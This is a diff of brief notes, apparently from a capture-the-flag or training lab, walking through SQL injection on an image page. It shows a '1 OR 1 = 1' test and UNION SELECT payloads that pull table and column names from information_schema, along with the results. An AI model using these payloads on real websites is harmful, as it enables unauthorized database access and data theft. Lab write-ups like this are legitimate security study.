@@ -1,10 +1,15 @@
-1 OR 1 = 1 
-For a fast check of image list.
+For the image page, we test a 1 OR 1=1 to see if sql injections are possible.
+1 OR 1 = 1
+Display each id as the page member.
 
+As for the member page we need more information.
+First the name of the table then of each column.
+
+To get the table name:
 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- -
-list_images
-Juste for know the name of table.
+Now we know that the table is called list_images
 
+To get all column names:
 1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database() -- -
 id,url,title,comment
 Now we know all colomns name let's check it.
